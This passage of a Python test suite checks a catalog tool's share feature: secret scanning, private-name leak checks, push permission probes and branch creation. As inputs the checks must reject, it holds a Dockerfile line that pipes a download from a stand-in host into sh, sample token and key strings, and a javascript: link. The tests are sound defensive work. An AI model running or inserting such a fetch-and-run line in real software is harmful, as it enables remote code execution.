                      "correct it so that docker compose config reads it, then try again.", problems, "a path of the Lab's folder")

    def test_the_rules_of_an_item_of_a_catalog_are_asked_of_the_personal_file_and_their_lines_are_problems(self):
        file = ".lab/catalogs/local/addons/scratch/compose.yml"
        asked = self.patch(check, "problems", mock.Mock(return_value=[
            (file, "x-gravitee.category is missing"), (file, "scratch-app: restart: always starts a stopped container again"),
            (".lab/catalogs/fixture/addons/port-core/compose.yml", "publishes port 8082, like docker-compose.yml"),
            (".gemini/settings.json", "is missing")]))
        self.patch(contribute, "_own_rules", REAL_OWN)
        answer = self.share(check_only=True)
        asked.assert_called_once_with(sharing=file)
        self.assertEqual(answer["problems"], ["x-gravitee.category is missing",
                                              "scratch-app: restart: always starts a stopped container again"],
                         "the lines about this file, and not about the project's other files")
        fetch = self.patch(contribute.bare, "fetch")
        with self.assertRaisesRegex(ValueError, "^x-gravitee.category is missing$"):
            self.share()
        fetch.assert_not_called()
        self.assertEqual(self.heads(), ["main"])

    def heads(self, ns="fixture"):
        return sorted(self.remote(ns).git("for-each-ref", "--format=%(refname:short)", "refs/heads").split("\n"))

    def test_an_include_written_on_one_line_keeps_the_long_path_and_is_a_problem_to_fix_first(self):
        said = ("It includes echo in a form that cannot be written again for Fixture catalog. Fix: write each include as a "
                "list item, - ../../addons/<name>/compose.yml.")
        self.item("addon", "flowy", "Flowy", "include: [../../../fixture/addons/echo/compose.yml]\nservices: {}\n")
        self.assertEqual(self.share("local/flowy", check_only=True)["problems"], [said])
        with self.assertRaisesRegex(ValueError, "^It includes echo in a form"):
            self.share("local/flowy")
        self.item("setup", "flowy", "Flowy", "include: [../../fixture/addons/echo/compose.yml]\n")
        self.assertEqual(self.share("local/flowy", kind="setup", check_only=True)["problems"], [said], "a setup is the same")
        self.item("addon", "listed", "Listed", "include:\n  - ../../../fixture/addons/echo/compose.yml\nservices: {}\n")
        self.assertEqual(self.share("local/listed", check_only=True)["problems"], [], "a list item is written again")
        # A unit of another catalog is at the same path at both places: the form does not matter
        self.item("addon", "ledgered", "Ledgered", "include: [../../../partner/addons/ledger/compose.yml]\nservices: {}\n")
        self.assertEqual(self.share("local/ledgered", check_only=True)["problems"], [])

    def test_a_secret_stops_the_share_and_the_line_names_the_file_never_the_secret(self):
        for path, text in (("README.md", "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n"),
                           ("README.md", "token: ghp_" + "a1B2c3D4e5" * 4),
                           ("README.md", "key AKIAIOSFODNN7EXAMPLE here"),
                           ("README.md", "xoxb-1234567890-abcdefghij"),
                           ("README.md", "jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1"),
                           ("README.md", "github_pat_" + "x" * 40),
                           ("README.md", "GRAVITEE_LICENSE: " + "A1b2" * 40),
                           ("apps/z/seed.json", '{"a": "ghp_' + "z" * 36 + '"}')):
            with self.subTest(path=path, text=text[:20]):
                self.write(f".lab/catalogs/local/addons/scratch/{path}", text)
                with self.assertRaises(CatalogError) as raised:
                    self.share(check_only=True)
                self.assertEqual(lines_of(raised.exception),
                                 ("share_secret", 400, f"{path} holds what looks like a secret. Remove it and share again."))
                self.assertNotIn(text[:20], raised.exception.message)
                os.unlink(self.root / f".lab/catalogs/local/addons/scratch/{path}")
        self.assertEqual(self.stages(), [])

    def test_a_secret_in_a_file_that_is_left_out_stops_nothing(self):
        self.write(".lab/catalogs/local/addons/scratch/.env", "TOKEN=ghp_" + "a" * 36)
        self.write(".lab/catalogs/local/addons/scratch/notes.txt", "ghp_" + "a" * 36)
        self.assertEqual(self.share(check_only=True)["problems"], [])

    def test_the_name_of_a_private_catalog_stops_a_share_to_a_public_one(self):
        self.write(".lab/catalogs/local/addons/scratch/README.md", "# Scratch\n\nBuilt with the Partner fixture catalog.\n")
        with self.assertRaises(CatalogError) as raised:
            self.share(check_only=True)
        self.assertEqual(lines_of(raised.exception), ("share_private", 400, "README.md names Partner fixture, which is private. Remove it and share again."))
        # Whole names only, and to a private one there is nothing to hide
        self.write(".lab/catalogs/local/addons/scratch/README.md", "# Scratch\n\nPartner fixtures are not named here.\n")
        self.assertEqual(self.share(check_only=True)["problems"], [])

    def test_a_copy_of_an_item_of_a_private_catalog_stops_a_share_to_a_public_one(self):
        self.item("addon", "my-ledger", "Ledger", 'x-gravitee: {copy_of: "@partner/ledger", kind: addon, name: Ledger, category: Other, '
                                               'description: Keeps the entries of a partner}\nservices: {}\n')
        with self.assertRaises(CatalogError) as raised:
            self.share("local/my-ledger", "fixture", check_only=True)
        self.assertEqual(lines_of(raised.exception), ("share_private_copy", 400, "Ledger is a copy of an item of Partner fixture, "
                                                                                "which is private. Fix: share it to a private catalog."))
        self.assertEqual(self.share("local/my-ledger", "partner", check_only=True)["problems"], [], "to a private one it may go")

    def test_a_copy_of_a_share_of_a_copy_of_a_private_item_stops_a_share_to_a_public_one(self):
        fixtures.install(self, "lab-new", "folder", audience="private", lab=1)
        shared = self.root / ".lab/catalogs/lab-new/addons/ledger/compose.yml"
        shared.parent.mkdir(parents=True, exist_ok=True)
        shared.write_text('x-gravitee: {copy_of: "@partner/ledger", kind: addon, name: Ledger}\nservices: {}\n')
        self.item("addon", "my-ledger", "Ledger", 'x-gravitee: {copy_of: "@lab-new/ledger", kind: addon, name: Ledger, category: Other, '
                                               'description: Keeps the entries of a partner}\nservices: {}\n')
        with self.assertRaises(CatalogError) as raised:
            self.share("local/my-ledger", "fixture", check_only=True)
        self.assertEqual(lines_of(raised.exception), ("share_private_copy", 400, "Ledger is a copy of an item of Partner fixture, "
                                                                                "which is private. Fix: share it to a private catalog."))
        shared.unlink()   # the item it was copied from is no longer here: nothing says the content is not private
        with self.assertRaises(CatalogError) as raised:
            self.share("local/my-ledger", "fixture", check_only=True)
        self.assertEqual(raised.exception.code, "share_private_copy")

    def test_an_image_prefix_and_an_address_of_a_private_catalog_are_names_too(self):
        self.yml["partner"] = {"images": "registry.example.invalid/partner/lab"}
        self.write(".lab/catalogs/local/addons/scratch/README.md", "docker pull registry.example.invalid/partner/lab/x\n")
        with self.assertRaises(CatalogError) as raised:
            self.share(check_only=True)
        self.assertEqual(raised.exception.code, "share_private")
        address = registry.display_address(registry.entry("partner")["url"])
        self.write(".lab/catalogs/local/addons/scratch/README.md", f"see {address}\n")
        with self.assertRaises(CatalogError) as raised:
            self.share(check_only=True)
        self.assertEqual(raised.exception.code, "share_private")
        self.item("addon", "plain", "Plain", "services: {}\n")
        self.write(".lab/catalogs/local/addons/plain/README.md", f"see {address} and Partner fixture\n")
        self.assertEqual(self.share("local/plain", "partner", check_only=True)["problems"], [], "it is where it is named")

    def test_the_id_and_the_registry_host_of_a_private_catalog_are_names_too(self):
        self.yml["partner"] = {"images": "registry.example.invalid/partner/lab"}
        for text in ("see the partner catalog", "Ask for the Partner Catalog", "catalog partner has it", "use @partner/ledger",
                     "include ../../../partner/addons/x/compose.yml", "docker pull registry.example.invalid/other-team/app:1",
                     "pushed to registry.example.invalid", "Registry.Example.Invalid is where it is"):
            self.write(".lab/catalogs/local/addons/scratch/README.md", f"# Scratch\n\n{text}\n")
            with self.subTest(text), self.assertRaises(CatalogError) as raised:
                self.share(check_only=True)
            self.assertEqual(lines_of(raised.exception), ("share_private", 400, "README.md names Partner fixture, which is private. "
                                                                               "Remove it and share again."))
        # Whole words only, an id is not a word of the language, and a registry everyone pulls from says nothing of a catalog
        self.yml["partner"] = {"images": "ghcr.io/acme-corp/lab"}
        for text in ("a partnership of two", "our partner will review it", "docker pull ghcr.io/graviteeio/seeder:1",
                     "docker pull registry.example.invalid/x:1", "the partner-catalog-less way"):
            self.write(".lab/catalogs/local/addons/scratch/README.md", f"# Scratch\n\n{text}\n")
            with self.subTest(text):
                self.assertEqual(self.share(check_only=True)["problems"], [])
        self.write(".lab/catalogs/local/addons/scratch/README.md", "# Scratch\n\ndocker pull ghcr.io/acme-corp/lab/x\n")
        with self.assertRaises(CatalogError):
            self.share(check_only=True)

    def test_an_id_is_looked_for_where_it_names_a_catalog_and_not_in_the_includes_that_were_judged(self):
        # The unit's own compose file includes by path: a catalog the target does not declare is `share_includes`, private
        # content under a Public one is Blocked, and neither is a leak of a name
        self.item("addon", "ledgered", "Ledgered", "include:\n  - ../../../partner/addons/ledger/compose.yml\nservices: {}\n")
        self.assertEqual(self.share("local/ledgered", "fixture", check_only=True)["problems"], [])
        self.write(".lab/catalogs/local/addons/ledgered/guide.md", "Needs ../../../partner/addons/ledger/compose.yml.\n")
        with self.assertRaises(CatalogError) as raised:
            self.share("local/ledgered", "fixture", check_only=True)
        self.assertEqual(lines_of(raised.exception), ("share_private", 400, "guide.md names Partner fixture, which is private. "
                                                                           "Remove it and share again."))
        # An id too short to be one thing, a catalog that is Public and the personal area are not looked for
        rows = {"fixture": {"name": "Fixture", "audience": "public"}, "lab": {"name": "Lab corp", "audience": "private"},
                "local": {"name": "Personal", "audience": "private"}, "wide-open": {"name": "Wide", "audience": "public"},
                "acme-hub": {"name": "Acme", "audience": "private"}}
        self.assertEqual(contribute._ids("fixture", rows), {"acme-hub": "Acme"})
        self.assertEqual(contribute._identifiers("fixture", rows), {"Lab corp": "Lab corp"}, "a name of five letters is a name")

    def test_a_problem_of_the_copy_is_a_problem_of_the_share(self):
        os.symlink("/etc/hostname", self.root / ".lab/catalogs/local/addons/scratch/seed")
        answer = self.share(check_only=True)
        self.assertEqual(answer["problems"], ["seed is a link. Fix: copy the file itself; a catalog installs no link."])
        with self.assertRaisesRegex(ValueError, "^seed is a link"):
            self.share()

    def test_a_second_change_at_the_same_time_is_busy(self):
        self.patch(registry, "FLOCK_WAIT", 0.2)
        held, free = threading.Event(), threading.Event()

        def hold():
            with registry.flock():
                held.set()
                free.wait(10)
        thread = threading.Thread(target=hold)
        thread.start()
        self.addCleanup(thread.join)
        self.addCleanup(free.set)
        held.wait(10)
        with self.assertRaises(CatalogError) as raised:
            self.share(check_only=True)
        self.assertEqual(lines_of(raised.exception), ("busy", 409, "Another catalog change is running. Try again in a moment."))
        self.assertEqual(self.stages(), [])

    def test_the_item_must_be_the_persons_and_the_catalog_one_they_have(self):
        for uid in ("echo", "local/../echo", "local/", "@partner/ledger"):
            with self.subTest(uid=uid), self.assertRaisesRegex(ValueError, "Only your own add-ons can be shared here"):
                self.share(uid, check_only=True)
        for to in ("local", "nope", "", None, 3, "../x"):
            with self.subTest(to=to), self.assertRaises(paths.NotFound):
                self.share(to=to, check_only=True)
        fixtures.declare(self, "lab-new")
        with self.assertRaisesRegex(paths.NotFound, "Lab new fixture is not downloaded|is not downloaded"):
            self.share(to="lab-new", check_only=True)

    def test_a_name_the_target_has_is_taken_but_only_in_the_kind_of_the_item(self):
        self.item("addon", "echo", "Echo", "services: {}\n")
        with self.assertRaises(CatalogError) as raised:
            self.share("local/echo", check_only=True)
        self.assertEqual(lines_of(raised.exception), ("share_exists", 409, "Echo already exists in Fixture catalog."))
        # In the other catalog the name is free, and a setup of that name is another item
        self.assertEqual(self.share("local/echo", "partner", check_only=True)["problems"], [])
        self.item("setup", "echo", "Echo", "include:\n  - ../../fixture/addons/echo/compose.yml\n")
        self.assertEqual(self.share("local/echo", "fixture", "setup", True)["problems"], [])

    def test_a_catalog_that_takes_no_contributions_refuses_them(self):
        self.yml["partner"] = {"contribute": "none"}
        self.item("addon", "plain", "Plain", "services: {}\n")
        with self.assertRaises(CatalogError) as raised:
            self.share("local/plain", "partner", check_only=True)
        self.assertEqual(lines_of(raised.exception), ("contribute_none", 400, "Partner fixture does not take contributions from the Lab."))

    def test_the_person_must_have_a_name_and_an_email_in_git(self):
        for text in ("", "[user]\n\tname = Test Person\n", "[user]\n\temail = person@corp.example.test\n"):
            (self.home / ".gitconfig").write_text(text)
            with self.assertRaises(CatalogError) as raised:
                self.share(check_only=True)
            self.assertEqual(lines_of(raised.exception), ("no_identity", 400, "Set your name and email in Git, then share again."))
        # Into a folder nothing is committed, so nobody is asked who
        fixtures.install(self, "lab-new", "folder")
        self.item("addon", "plain", "Plain", "services: {}\n")
        self.assertEqual(self.share("local/plain", "lab-new", check_only=True)["identity"], None)

    def test_the_push_probe_is_asked_once_in_ten_minutes_and_a_refusal_stops_the_share(self):
        now = [1000.0]
        self.patch(contribute, "_clock", lambda: now[0])
        probe = self.patch(gitx, "push_probe", return_value="yes")
        self.share(check_only=True)
        self.share(check_only=True)
        self.assertEqual(probe.call_count, 1)
        now[0] += contribute.PROBE_AGE + 1
        probe.return_value = "no"
        for _ in range(2):
            with self.assertRaises(CatalogError) as raised:
                self.share(check_only=True)
            self.assertEqual(lines_of(raised.exception), ("no_write_access", 400, "You cannot push to Fixture catalog. Ask for access."))
        self.assertEqual(probe.call_count, 2)

    def test_a_host_that_refuses_the_sign_in_at_the_probe_stops_the_share_before_anything_is_made(self):
        script = gitfixture.fake_git(self, '''case " $* " in *" --dry-run "*) cat "$(dirname "$0")/said" >&2; echo x >> "$(dirname "$0")/asked"; exit 128;; esac
exec "$REAL" "$@"''')
        script.with_name("said").write_text("fatal: Authentication failed for 'https://x.invalid/a/b.git/'\n")
        for _ in range(2):
            with self.assertRaises(CatalogError) as raised:
                self.share()
            self.assertEqual(raised.exception.code, "no_write_access")
        self.assertEqual(script.with_name("asked").read_text(), "x\n", "the second time it was remembered, not asked")
        self.assertEqual(self.stages(), [])

    def test_a_probe_that_did_not_get_an_answer_is_no_refusal_and_is_not_remembered(self):
        probe = self.patch(gitx, "push_probe", return_value="unknown")
        self.share(check_only=True)
        self.share(check_only=True)
        self.assertEqual(probe.call_count, 2)

    def test_the_probe_pushes_the_catalogs_own_tip_from_its_store(self):
        probe = self.patch(gitx, "push_probe", return_value="yes")
        self.share(check_only=True)
        address, commit = probe.call_args[0]
        self.assertEqual(commit, self.remote("fixture").git("rev-parse", "main"))
        self.assertEqual(probe.call_args[1]["store"], self.root / ".lab/cache/git/fixture.git")
        self.assertTrue(address.url.startswith("file://"))


class Rules(Seam):
    """The rules of the catalog standard over what would be copied, as the catalog's CI reads them."""

    def setUp(self):
        super().setUp()
        self.patch(contribute, "_rules", REAL_RULES)

    def test_a_secret_the_standard_finds_in_the_copy_is_a_secret_too(self):
        self.item("addon", "weak", "Weak", "services:\n  weak:\n    image: busybox\n    environment:\n      WEAK_PASSWORD: hunter2\n")
        with self.assertRaises(CatalogError) as raised:
            self.share("local/weak", check_only=True)
        self.assertEqual(lines_of(raised.exception), ("share_secret", 400, "compose.yml holds what looks like a secret. Remove it and share again."))
        self.write(".lab/catalogs/local/addons/weak/compose.yml", "services:\n  weak:\n    image: busybox\n    environment:\n      WEAK_PASSWORD: ${WEAK_PASSWORD:-}\n")
        self.assertEqual(self.share("local/weak", check_only=True)["problems"], [])

    def test_the_rules_of_the_standard_are_asked_of_what_would_be_copied(self):
        self.write(".lab/catalogs/local/addons/scratch/apps/z/Dockerfile", "FROM busybox:1.36\nRUN wget -O- http://x.invalid/i | sh\n")
        problems = self.share(check_only=True)["problems"]
        self.assertEqual(len(problems), 1, problems)
        self.assertRegex(problems[0], r"^addons/scratch/apps/z/Dockerfile:2: ")
        self.write(".lab/catalogs/local/addons/scratch/apps/z/Dockerfile", "FROM busybox:1.36\n")
        self.assertEqual(self.share(check_only=True)["problems"], [])

    def test_a_guide_and_an_image_the_standard_refuses_are_problems_to_fix_first(self):
        self.bank(**{"guide.md": "# Shop\n\n## 1. One\n\n[x](javascript:alert(1))\n"})
        problems = self.share("local/bank", "fixture", "playground", True)["problems"]
        self.assertTrue(any(line.startswith("playgrounds/bank/guide.md:") for line in problems), problems)
        text = (self.root / ".lab/catalogs/local/playgrounds/bank/compose.yml").read_text().replace("    pull_policy: ${FIXTURE_SHOP_PULL_POLICY:-build}   # build: build it here at each start; always: pull it, build it here if it cannot be pulled\n", "", 1)
        self.write(".lab/catalogs/local/playgrounds/bank/compose.yml", text)
        problems = self.share("local/bank", "fixture", "playground", True)["problems"]
        self.assertTrue(any("pull_policy" in line for line in problems), problems)

    def test_a_standard_that_is_broken_is_a_fault_not_a_pass(self):
        broken = mock.Mock(side_effect=NameError("boom"))
        with mock.patch(f"{contribute.__package__}.rules.structure.check", broken), self.assertRaises(NameError):
            self.share(check_only=True)


class Published(Seam):
    """A repository gets a branch: the commit, the name, the push, and what a refusal leaves."""

    def heads(self, ns="fixture"):
        return sorted(self.remote(ns).git("for-each-ref", "--format=%(refname:short)", "refs/heads").split("\n"))

    def test_a_branch_holds_the_files_of_the_tip_and_exactly_the_allow_listed_ones_over_it(self):
        remote = self.remote("fixture")
        tip = remote.git("rev-parse", "main")
        before = remote.git("ls-tree", "-r", "--name-only", "main").split("\n")
        done = self.share()
        self.assertEqual(sorted(done), ["branch", "commit", "pull_request", "repository"])
        self.assertEqual((done["branch"], done["repository"], done["pull_request"]), (f"lab/scratch-{DAY}", "fixture", None))
        self.assertEqual(self.heads(), [f"lab/scratch-{DAY}", "main"])
        self.assertEqual(remote.git("rev-parse", "main"), tip, "the default branch is never pushed to")
        self.assertEqual(remote.git("rev-parse", f"lab/scratch-{DAY}")[:7], done["commit"])
        after = remote.git("ls-tree", "-r", "--name-only", f"lab/scratch-{DAY}").split("\n")
        self.assertEqual(sorted(set(after) - set(before)), ["addons/scratch/README.md", "addons/scratch/compose.yml"])
        self.assertEqual(sorted(set(before) - set(after)), [])
        self.assertIn("  - ../echo/compose.yml\n", remote.git("show", f"lab/scratch-{DAY}:addons/scratch/compose.yml") + "\n")

    def test_what_only_this_machine_has_goes_in_the_same_branch_and_one_commit(self):
        self.write(".lab/tested.json", json.dumps({"local/demo": [{"versions": {}, "images": {}, "at": "2026-01-01T00:00:00Z"}]}))
        self.item("playground", "demo", "Demo", "x-gravitee: {kind: playground, name: Demo}\ninclude:\n  - ../../addons/scratch/compose.yml\n"
                  "services: {}\n", includes=["local/scratch"])
        self.units["addons"]["local/scratch"]["needs"] = ["echo"]
        done = self.share("local/demo", "fixture", "playground")
        remote = self.remote("fixture")
        self.assertEqual(done["branch"], f"lab/demo-{DAY}")
        files = remote.git("ls-tree", "-r", "--name-only", done["branch"]).split("\n")
        self.assertIn("playgrounds/demo/compose.yml", files)
        self.assertIn("addons/scratch/compose.yml", files)
        self.assertEqual(remote.git("rev-list", "--count", f"{done['branch']}^..{done['branch']}"), "1")
        self.assertIn("  - ../../addons/scratch/compose.yml", remote.git("show", f"{done['branch']}:playgrounds/demo/compose.yml"))

    def test_the_commit_is_the_persons_with_the_tip_as_its_parent_and_a_subject_and_nothing_else(self):
        remote = self.remote("fixture")
        tip = remote.git("rev-parse", "main")
        self.share()
        message = remote.git("log", "-1", "--format=%an|%ae|%cn|%ce|%P|%B", f"lab/scratch-{DAY}")
        self.assertEqual(message, f"{WHO['name']}|{WHO['email']}|{WHO['name']}|{WHO['email']}|{tip}|Add Scratch")
        self.assertEqual(remote.git("rev-list", "--count", f"main..lab/scratch-{DAY}"), "1")
        raw = remote.git("cat-file", "-p", f"lab/scratch-{DAY}")
        for word in ("Co-Authored-By", "Co-authored-by", "Signed-off-by", "gpgsig", "Claude", "Generated"):
            self.assertNotIn(word, raw)

    def test_a_signing_configuration_of_the_person_does_not_get_in_the_way(self):
        self.person(more="[commit]\n\tgpgsign = true\n[gpg]\n\tprogram = /nonexistent/gpg\n")
        self.share()
        self.assertNotIn("gpgsig", self.remote("fixture").git("cat-file", "-p", f"lab/scratch-{DAY}"))

    def test_the_tip_that_was_just_fetched_is_the_base_not_the_one_that_was_installed(self):
        remote = self.remote("fixture")
        newer = remote.commit({"README.md": "A new readme\n"}, "Add a readme")
        done = self.share()
        self.assertEqual(remote.git("rev-parse", f"{done['branch']}^"), newer)
        self.assertIn("README.md", remote.git("ls-tree", "-r", "--name-only", done["branch"]).split("\n"))

    def test_a_name_the_tip_has_by_now_is_taken(self):
        self.remote("fixture").commit({"addons/scratch/compose.yml": "services: {}\n"}, "Add scratch")
        with self.assertRaises(CatalogError) as raised:
            self.share()
        self.assertEqual(lines_of(raised.exception), ("share_exists", 409, "Scratch already exists in Fixture catalog."))
        self.assertEqual(self.heads(), ["main"])

    def test_a_branch_of_that_name_that_the_repository_has_gets_a_number(self):
        names = [self.share()["branch"] for _ in range(3)]
        self.assertEqual(names, [f"lab/scratch-{DAY}", f"lab/scratch-{DAY}-2", f"lab/scratch-{DAY}-3"])
        self.assertEqual(self.heads(), ["lab/scratch-20261016", "lab/scratch-20261016-2", "lab/scratch-20261016-3", "main"])

    def test_the_item_stays_where_it_was_and_runs_with_its_settings(self):
        self.write(".lab/catalogs/local/addons/scratch/.env", "TOKEN=real\n")
        self.write(".lab/catalogs/local/addons/scratch/.state/created.json", "{}")
        self.write(".lab/starred.json", json.dumps({"addon": ["local/scratch"]}))
        before, texts = self.mine(), {path: (self.root / path).read_bytes() for path in self.mine()}
        self.share()
        self.assertEqual(self.mine(), before)
        self.assertEqual({path: (self.root / path).read_bytes() for path in self.mine()}, texts)
        self.assertEqual(json.loads((self.root / ".lab/starred.json").read_text()), {"addon": ["local/scratch"]})
        self.assertEqual(self.stages(), [])
        self.assertEqual((self.root / ".lab/catalogs/local/addons/scratch/.env").read_text(), "TOKEN=real\n")
        self.assertNotIn("TOKEN", self.remote("fixture").git("grep", "-l", "TOKEN", f"lab/scratch-{DAY}", "--", ".") or "")

    def test_the_machines_files_are_in_no_commit(self):
        for path, text in ((".env", "TOKEN=real"), (".state/created.json", "{}"), ("secrets/key", "k"), ("server.key", "k"),
                           ("notes.txt", "mine"), (".DS_Store", "x"), ("README.md.bak", "x"), (".github/workflows/x.yml", "on: push")):
            self.write(f".lab/catalogs/local/addons/scratch/{path}", text)
        branch = self.share()["branch"]
        self.assertEqual(self.remote("fixture").git("ls-tree", "-r", "--name-only", branch, "--", "addons/scratch").split("\n"),
                         ["addons/scratch/README.md", "addons/scratch/compose.yml"])

    def test_the_mode_of_a_file_is_kept_and_a_file_is_what_it_was_byte_for_byte(self):
        self.person(more="[core]\n\tautocrlf = true\n")   # a setting of theirs that would change the bytes of a file
        self.bank()
        run = self.root / ".lab/catalogs/local/playgrounds/bank/apps/web/run.sh"
        run.write_bytes(b"#!/bin/sh\r\necho \xff\n")
        run.chmod(0o755)
        self.units["playgrounds"]["local/bank"]["name"] = "Bank"
        branch = self.share("local/bank", "fixture", "playground")["branch"]
        remote = self.remote("fixture")
        self.assertEqual(remote.git("ls-tree", branch, "playgrounds/bank/apps/web/run.sh").split()[0], "100755")
        self.assertEqual(remote.git("ls-tree", branch, "playgrounds/bank/compose.yml").split()[0], "100644")
        blob = remote.git("rev-parse", f"{branch}:playgrounds/bank/apps/web/run.sh")
        self.assertEqual(blob, gitfixture.git("hash-object", "--no-filters", "--stdin", input=run.read_bytes()).strip())

    def test_a_setup_is_one_file_of_the_branch(self):
        self.item("setup", "mine", "Mine", "include:\n  - ../../fixture/addons/echo/compose.yml\n")
        done = self.share("local/mine", "fixture", "setup")
        self.assertEqual(done["branch"], f"lab/mine-{DAY}")
        self.assertEqual(self.remote("fixture").git("show", f"{done['branch']}:setups/mine.yml"), "include:\n  - ../addons/echo/compose.yml")
        self.assertEqual(self.remote("fixture").git("diff", "--name-only", f"main..{done['branch']}"), "setups/mine.yml")

    def test_the_address_that_opens_a_pull_request_is_built_from_the_catalogs_own(self):
        github = gitx.parse_address("https://github.com/acme/lab-hub.git")
        gitlab = gitx.parse_address("git@gitlab.com:acme/lab-hub.git")
        other = gitx.parse_address("https://git.example.invalid/acme/lab-hub.git")
        self.assertEqual(contribute._pull_request(github, "lab/bank-20261016"),
                         "https://github.com/acme/lab-hub/compare/lab/bank-20261016?expand=1")
        self.assertEqual(contribute._pull_request(gitlab, "lab/bank-20261016"),
                         "https://gitlab.com/acme/lab-hub/-/merge_requests/new?merge_request[source_branch]=lab%2Fbank-20261016")
        self.assertIsNone(contribute._pull_request(other, "lab/bank-20261016"))

    def test_a_host_that_refuses_the_branch_is_push_rejected_and_nothing_is_left(self):
        remote = self.remote("fixture")
        hooks = Path(remote.bare) / "hooks"
        hooks.mkdir(exist_ok=True)
        (hooks / "pre-receive").write_text("#!/bin/sh\necho 'branch protection' >&2\nexit 1\n")
        (hooks / "pre-receive").chmod(0o755)
        before = self.mine()
        with self.assertRaises(CatalogError) as raised:
            self.share()
        self.assertEqual(lines_of(raised.exception), ("push_rejected", 502, "localhost refused the branch. Check that you can push, then share again."))
        self.assertEqual(self.heads(), ["main"])
        self.assertEqual(self.mine(), before, "the item is where it was")
        self.assertEqual(self.stages(), [])
        self.assertIn("branch protection", raised.exception.detail["output"])

    def test_a_host_that_refuses_the_sign_in_is_no_write_access_and_the_network_keeps_its_own_line(self):
        script = gitfixture.fake_git(self, '''case " $* " in *" --dry-run "*) exec "$REAL" "$@";; esac
case " $* " in *" push "*) cat "$(dirname "$0")/said" >&2; exit 128;; esac
exec "$REAL" "$@"''')
        for said, code, status, line in (
                ("fatal: Authentication failed for 'https://x.invalid/a/b.git/'", "no_write_access", 400,
                 "You cannot push to Fixture catalog. Ask for access."),
                ("git@x.invalid: Permission denied (publickey).", "no_write_access", 400,
                 "You cannot push to Fixture catalog. Ask for access."),
                ("fatal: unable to access 'https://x.invalid/': Could not resolve host: x.invalid", "unreachable", 502,
                 "Cannot reach localhost. Check your connection, then try again.")):
            script.with_name("said").write_text(said + "\n")
            contribute._PROBES.clear()   # a refusal is remembered for ten minutes: each message is a first time
            with self.subTest(said=said[:30]), self.assertRaises(CatalogError) as raised:
                self.share()
            self.assertEqual(lines_of(raised.exception), (code, status, line))
        self.assertEqual(self.heads(), ["main"])

    def test_a_push_the_host_refused_is_remembered_like_a_probe_that_said_no_and_a_network_failure_is_not(self):
        script = gitfixture.fake_git(self, '''case " $* " in *" --dry-run "*) exec "$REAL" "$@";; esac
case " $* " in *" push "*) cat "$(dirname "$0")/said" >&2; exit 128;; esac
exec "$REAL" "$@"''')
        script.with_name("said").write_text("fatal: unable to access 'https://x.invalid/': Could not resolve host: x.invalid\n")
        with self.assertRaises(CatalogError) as raised:
            self.share()
        self.assertEqual(raised.exception.code, "unreachable")
        found = {one["id"]: one for one in contribute.destinations(self.units, "addon", "local/scratch")}
        self.assertEqual((found["fixture"]["writable"], found["fixture"]["reason"]), (True, ""), "the network is not the permission")
        script.with_name("said").write_text("fatal: Authentication failed for 'https://x.invalid/a/b.git/'\n")
        with self.assertRaises(CatalogError) as raised:
            self.share()
        self.assertEqual(raised.exception.code, "no_write_access")
        found = {one["id"]: one for one in contribute.destinations(self.units, "addon", "local/scratch")}
        self.assertEqual((found["fixture"]["writable"], found["fixture"]["reason"]),
                         (False, "You cannot push to Fixture catalog. Ask for access."))
        fetch = self.patch(contribute.bare, "fetch")
        with self.assertRaises(CatalogError) as raised:
            self.share()
        self.assertEqual(raised.exception.code, "no_write_access")
        fetch.assert_not_called()   # the probe said no, from what the push said
        self.assertEqual(self.heads(), ["main"])

    def test_a_person_with_no_name_or_email_cannot_share_and_nothing_is_fetched(self):
        (self.home / ".gitconfig").write_text("")
        fetch = self.patch(contribute.bare, "fetch")
        with self.assertRaises(CatalogError) as raised:
            self.share()
        self.assertEqual(raised.exception.code, "no_identity")
        fetch.assert_not_called()

    def test_a_problem_of_the_copy_stops_the_share_before_the_network_is_asked(self):
        self.against = ["Mounts the Docker socket"]
        fetch = self.patch(contribute.bare, "fetch")
        with self.assertRaisesRegex(ValueError, "Mounts the Docker socket"):
            self.share()
        fetch.assert_not_called()
        self.assertEqual(self.heads(), ["main"])

    def test_the_commit_is_built_in_the_store_with_no_working_tree_and_no_index_left(self):
        store = self.root / ".lab/cache/git/fixture.git"
        scratch = tempfile.mkdtemp(prefix="share-scratch-")   # a folder of its own: another run's scratch is not this one's
        self.addCleanup(shutil.rmtree, scratch, True)
        self.patch(tempfile, "tempdir", scratch)
        self.share()
        self.assertFalse((store / "index").exists())
        self.assertEqual([name for name in os.listdir(scratch) if name.startswith("gravitee-lab-share-")], [])
        self.assertEqual(fixtures.Remote(store).git("rev-parse", "--is-bare-repository"), "true")

    def test_a_git_that_is_old_or_missing_is_the_catalogs_refusal(self):
        self.patch(gitx, "executable", return_value=None)
        with self.assertRaises(CatalogError) as raised:
            self.share()
        self.assertEqual(raised.exception.code, "git_missing")


class Copied(Seam):
    """A folder catalog gets a plain copy of the same files, after the same pre-flight."""

    def setUp(self):
        super().setUp()
        self.folder_of = fixtures.install(self, "lab-new", "folder", audience="private")   # a catalog of the person's, a folder
        self.target = self.root / ".lab/catalogs/lab-new"

    def test_the_files_are_copied_into_the_folder_to_edit(self):
        self.bank()
        done = self.share("local/bank", "lab-new", "playground")
        self.assertEqual(done, {"copied": "Newer Lab fixture"})
        copy = contribute.collect("playground", "bank", "lab-new")
        for path, (mode, data) in copy.files.items():
            there = self.target / path
            self.assertEqual(there.read_bytes(), data, path)
            self.assertEqual(there.stat().st_mode & 0o777, int(mode[-3:], 8), path)
        for folder in (self.target / "playgrounds/bank", self.target / "playgrounds/bank/seed"):
            self.assertEqual(folder.stat().st_mode & 0o777, 0o755)
        self.assertEqual(sorted(path.name for path in (self.target / "playgrounds").iterdir()), ["bank"], "no hidden half is left")
        self.assertEqual(self.stages(), [])

    def test_a_setup_is_one_file(self):
        self.item("setup", "mine", "Mine", "include:\n  - ../../lab-new/addons/newer/compose.yml\n")
        self.assertEqual(self.share("local/mine", "lab-new", "setup"), {"copied": "Newer Lab fixture"})
        self.assertEqual((self.target / "setups/mine.yml").read_text(), "include:\n  - ../addons/newer/compose.yml\n")
        self.assertEqual((self.target / "setups/mine.yml").stat().st_mode & 0o777, 0o644)
        self.assertEqual(sorted(path.name for path in (self.target / "setups").iterdir()), ["mine.yml"])

    def test_no_git_is_run_for_a_folder_and_nobody_is_asked_who(self):
